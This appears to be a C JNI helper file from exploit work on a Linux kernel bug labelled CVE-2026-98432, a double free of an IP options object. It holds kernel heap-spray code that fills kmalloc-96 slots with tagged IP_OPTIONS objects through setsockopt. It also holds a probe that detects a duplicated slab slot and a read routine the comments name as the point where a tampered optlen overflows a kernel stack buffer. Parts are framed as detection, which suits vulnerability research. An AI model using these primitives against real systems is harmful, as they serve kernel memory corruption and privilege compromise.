// Native helpers for the CVE-2026-98432 work.
//
// Everything here exists because the interesting interfaces are syscalls that
// the Java networking stack does not expose:
//
//   * setsockopt(IP_OPTIONS)   makes the kernel allocate an ip_options_rcu and
//                              hang it off the socket's inet_opt
//   * getsockopt(IP_OPTIONS)   reads that object back with
//                              memcpy(optbuf, &inet_opt->opt,
//                                     sizeof(struct ip_options) +
//                                     inet_opt->opt.optlen)
//                              into a fixed 56 byte stack buffer, so a tampered
//                              optlen turns the read into a stack overflow
//
// Bind failures are reported with the real errno in the returned string. The
// first attempt at building a listener just said "failed", which is not enough
// to tell EADDRINUSE from a namespace problem, and those two need completely
// different fixes.

#include <jni.h>

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define IP_OPTIONS 4

// A record route option covering the whole 40 byte area.
//
// Length has to be 3 + 4n, so 39 leaves one byte for a NOP. The pointer is
// parked past the last slot so the receive path has nothing to stamp: with
// pointer <= optlen the kernel rewrites option bytes with the preferred source
// address, which would change them underneath the test.
static void fill_rr(unsigned char *buf, int len, uint32_t tag)
{
    memset(buf, 0, len);
    buf[0] = 7;             // IPOPT_RR
    buf[1] = (unsigned char)(len - 1);
    buf[2] = (unsigned char)len;
    buf[3] = (unsigned char)(tag >> 24);
    buf[4] = (unsigned char)(tag >> 16);
    buf[5] = (unsigned char)(tag >> 8);
    buf[6] = (unsigned char)(tag);
    if (len > 1) {
        buf[len - 1] = 1;   // IPOPT_NOP
    }
}

static jstring err(JNIEnv *env, const char *what, int code)
{
    char msg[192];
    snprintf(msg, sizeof(msg), "%s: %s (%d)", what, strerror(code), code);
    return (*env)->NewStringUTF(env, msg);
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_applyOptions(JNIEnv *env, jclass cls, jint fd, jint tag)
{
    (void)env;
    (void)cls;

    unsigned char opts[40];
    fill_rr(opts, sizeof(opts), (uint32_t)tag);

    if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts)) < 0) {
        return -errno;
    }
    return 0;
}

// Read the options back. If optlen was tampered with while the object sat in a
// freed slab slot, this is where the kernel overruns its own stack buffer.
JNIEXPORT jstring JNICALL
Java_com_inj_Native_readOptions(JNIEnv *env, jclass cls, jint fd)
{
    (void)cls;

    unsigned char buf[512];
    socklen_t len = sizeof(buf);
    memset(buf, 0, sizeof(buf));

    if (getsockopt(fd, IPPROTO_IP, IP_OPTIONS, buf, &len) < 0) {
        return err(env, "getsockopt", errno);
    }

    char hex[3 * 512 + 64];
    int n = snprintf(hex, sizeof(hex), "len=%d ", (int)len);
    for (socklen_t i = 0; i < len && n < (int)sizeof(hex) - 4; i++) {
        n += snprintf(hex + n, sizeof(hex) - n, "%02x", buf[i]);
    }
    return (*env)->NewStringUTF(env, hex);
}

// Listening TCP socket on addr:port.
//
// Returns {fd, 0} on success or {-1, errno} on failure. The kernel fd is handed
// back rather than kept here because everything that matters afterwards -
// setsockopt(IP_OPTIONS), the SYN that creates a request socket, the child that
// inherits the options object - happens on this one descriptor.
JNIEXPORT jintArray JNICALL
Java_com_inj_Native_makeListener(JNIEnv *env, jclass cls, jstring addr, jint port)
{
    (void)cls;

    jint out[2];
    out[0] = -1;
    out[1] = 0;

    const char *addr_utf = (*env)->GetStringUTFChars(env, addr, NULL);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        out[1] = errno;
        (*env)->ReleaseStringUTFChars(env, addr, addr_utf);
        jintArray r = (*env)->NewIntArray(env, 2);
        (*env)->SetIntArrayRegion(env, r, 0, 2, out);
        return r;
    }

    // Without this a listener cannot be recreated during a test run while old
    // connections are still in TIME_WAIT.
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, addr_utf, &sa.sin_addr) != 1) {
        out[1] = EINVAL;
        close(fd);
        (*env)->ReleaseStringUTFChars(env, addr, addr_utf);
        jintArray r = (*env)->NewIntArray(env, 2);
        (*env)->SetIntArrayRegion(env, r, 0, 2, out);
        return r;
    }
    (*env)->ReleaseStringUTFChars(env, addr, addr_utf);

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        out[1] = errno;
        close(fd);
        jintArray r = (*env)->NewIntArray(env, 2);
        (*env)->SetIntArrayRegion(env, r, 0, 2, out);
        return r;
    }

    if (listen(fd, 128) < 0) {
        out[1] = errno;
        close(fd);
        jintArray r = (*env)->NewIntArray(env, 2);
        (*env)->SetIntArrayRegion(env, r, 0, 2, out);
        return r;
    }

    out[0] = fd;
    jintArray r = (*env)->NewIntArray(env, 2);
    (*env)->SetIntArrayRegion(env, r, 0, 2, out);
    return r;
}

// UDP socket carrying its own options object, no TCP involved.
//
// Useful as a control: if the object survives here but not on the TCP path, the
// difference is the request socket lifetime rather than the allocation itself.
JNIEXPORT jintArray JNICALL
Java_com_inj_Native_makeUdp(JNIEnv *env, jclass cls, jint tag)
{
    (void)cls;

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        return NULL;
    }

    unsigned char opts[40];
    fill_rr(opts, sizeof(opts), (uint32_t)tag);
    if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts)) < 0) {
        int e = errno;
        close(fd);
        errno = e;
        return NULL;
    }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(9999);
    sa.sin_addr.s_addr = inet_addr("10.7.7.9");
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    jintArray out = (*env)->NewIntArray(env, 1);
    jint v = fd;
    (*env)->SetIntArrayRegion(env, out, 0, 1, &v);
    return out;
}

// Allocate many options objects with distinct tags, then read them all back.
//
// This is the detector for the double free. If inet_ehash_nolisten() failed
// and freed an ip_options_rcu that the request socket still pointed at, the
// same kmalloc-96 slot comes back twice. Two sockets then own one object, the
// second setsockopt overwrites the first one's bytes, and reading either back
// shows a tag that belongs to the other - or shows one of them twice.
//
// Every socket gets tag = index, so a clean run returns exactly one hit per
// index. Anything else means the slab handed out a duplicate slot.
JNIEXPORT jstring JNICALL
Java_com_inj_Native_probeHeap(JNIEnv *env, jclass cls, jint count)
{
    (void)cls;

    if (count < 2) {
        count = 2;
    }
    if (count > 128) {
        count = 128;
    }

    int *fds = (int *)calloc((size_t)count, sizeof(int));
    if (fds == NULL) {
        return (*env)->NewStringUTF(env, "alloc failed");
    }

    int made = 0;
    for (int i = 0; i < count; i++) {
        fds[i] = -1;

        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) {
            break;
        }

        unsigned char opts[40];
        fill_rr(opts, sizeof(opts), (uint32_t)i);
        if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts)) < 0) {
            close(fd);
            continue;
        }

        fds[i] = fd;
        made++;
    }

    // Read every object back after all of them exist. Reading as we go would
    // miss the case where a later allocation overwrote an earlier one.
    int mismatched = 0;
    int bad_length = 0;
    int dup = 0;
    char detail[256];
    detail[0] = '\0';

    unsigned char seen[128];
    memset(seen, 0, sizeof(seen));

    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) {
            continue;
        }

        unsigned char buf[64];
        socklen_t len = sizeof(buf);
        memset(buf, 0, sizeof(buf));

        if (getsockopt(fds[i], IPPROTO_IP, IP_OPTIONS, buf, &len) < 0) {
            bad_length++;
            continue;
        }

        if (len != 40) {
            bad_length++;
            if (detail[0] == '\0') {
                snprintf(detail, sizeof(detail),
                         " first anomaly: slot %d reported len=%d", i, (int)len);
            }
            continue;
        }

        // The tag sits at bytes 3..6 of the option area. Anything else means
        // these bytes do not belong to this socket.
        uint32_t tag = ((uint32_t)buf[3] << 24) | ((uint32_t)buf[4] << 16)
                     | ((uint32_t)buf[5] << 8) | (uint32_t)buf[6];

        if (tag != (uint32_t)i) {
            mismatched++;
            if (detail[0] == '\0') {
                snprintf(detail, sizeof(detail),
                         " first anomaly: slot %d holds tag %u", i, tag);
            }
        }

        if (tag < 128) {
            if (seen[tag]) {
                dup++;
                if (detail[0] == '\0') {
                    snprintf(detail, sizeof(detail),
                             " first anomaly: tag %u seen twice", tag);
                }
            }
            seen[tag] = 1;
        }
    }

    for (int i = 0; i < count; i++) {
        if (fds[i] >= 0) {
            close(fds[i]);
        }
    }
    free(fds);

    char out[512];
    snprintf(out, sizeof(out),
             "made=%d mismatched=%d badlen=%d dup=%d%s%s",
             made, mismatched, bad_length, dup,
             detail[0] ? " |" : "", detail);
    return (*env)->NewStringUTF(env, out);
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_closeFd(JNIEnv *env, jclass cls, jint fd)
{
    (void)env;
    (void)cls;
    return close(fd);
}